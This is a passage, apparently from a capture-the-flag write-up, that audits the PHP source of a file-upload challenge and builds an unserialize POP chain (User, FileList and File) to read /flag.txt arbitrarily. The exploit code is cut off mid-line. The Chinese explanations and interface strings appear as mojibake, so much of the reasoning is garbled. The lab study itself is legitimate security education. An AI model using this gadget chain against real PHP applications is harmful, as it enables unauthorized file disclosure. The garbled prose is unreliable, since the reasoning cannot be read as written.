class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;execute();<br>        <span class="hljs-variable">$stmt</span>-&gt;bind_result(<span class="hljs-variable">$expect</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;db-&gt;close();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = scandir(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = array_search(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = array_search(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> File();<br>            <span class="hljs-variable">$file</span>-&gt;open(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            array_push(<span class="hljs-keyword">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;name()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;name()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;æ¶“å¬­æµ‡&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;é’çŠ»æ«&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$filename</span>) &amp;&amp; !is_dir(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> basename(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = filesize(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> round(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        unlink(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>])) &#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-variable">$pos</span> = strrpos(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$filename</span> = substr(<span class="hljs-variable">$filename</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$pos</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/gif&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/jpeg&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/png&#x27;</span>:<br>            <span class="hljs-variable">$fileext</span> = <span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Only gif/jpg/png allowed&quot;</span>);<br>            Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>            <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>            <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; strlen(<span class="hljs-variable">$filename</span>) !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$dst</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>] . <span class="hljs-variable">$filename</span> . <span class="hljs-variable">$fileext</span>;<br>        move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$dst</span>);<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>        Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Invaild filename&quot;</span>);<br>        Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>        <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br>chdir(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> File();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;open(<span class="hljs-variable">$filename</span>)) &#123;<br>    <span class="hljs-variable">$file</span>-&gt;detele();<br>    Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    Header(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;File not exist&quot;</span>);<br>    <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$response</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>å®¡è®¡æºç ï¼Œæˆ‘ä»¬å‘ç° class.php File::close() æ–¹æ³•å¯ä»¥ä»»æ„è¯»å–æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹å®ƒçš„å¼•ç”¨</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221406010.png" alt="image-20220122140604924"></p><p>åœ¨ download.phpé‚£é‡Œè§¦å‘ï¼Œæ¥åˆ°download.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221724212.png" alt="image-20220122172401056"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰open_basedirè®¾ç½®ï¼Œè€Œä¸”æœ‰filenameé™åˆ¶æ‰€ä»¥æ²¡æ³•åœ¨è¿™é‡Œæï¼Œæ˜¾ç„¶åˆè€ƒåˆ°äº†popé“¾æ„é€ </p><p>é‡æ–°å›åˆ°class.phpï¼ˆç²¾ç®€äº†ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;db-&gt;close();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = scandir(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;name()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;æ¶“å¬­æµ‡&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;é’çŠ»æ«&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        unlink(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">å¯ä»¥çœ‹åˆ°  User::__destructæœ‰closeæ–¹æ³• è¿™é‡Œå¯ä»¥è®©ä»–ä¸ºFilelistï¼Œä¸ºä»€ä¹ˆä¸èƒ½æ˜¯Fileçš„å®ä¾‹åŒ–ï¼Ÿå› ä¸ºfile_get_contentsåªè´Ÿè´£æŠŠç»“æœä¼ é€’ç»™å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æå®šä»–çš„è¾“å‡ºé—®é¢˜é‚£å…ˆè®©ä»–ä¸ºFilelistå¯¹è±¡ï¼Œå³ $this-&gt;db-&gt;close è¿™é‡Œdb=new Filelist() è¿™æ—¶å°±ä¼šè°ƒç”¨Filelist::__call(),å› ä¸ºFilelistæ²¡æœ‰closeæ–¹æ³•ã€‚è¿™é‡Œcallå¯ä»¥ç›´æ¥è°ƒç”¨closeæ–¹æ³•</code></pre></div><p>äºæ˜¯æœ‰exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;files=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> File());<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/flag.txt&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> FileList();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> User();<br><span class="hljs-variable">$c</span>-&gt;db=<span 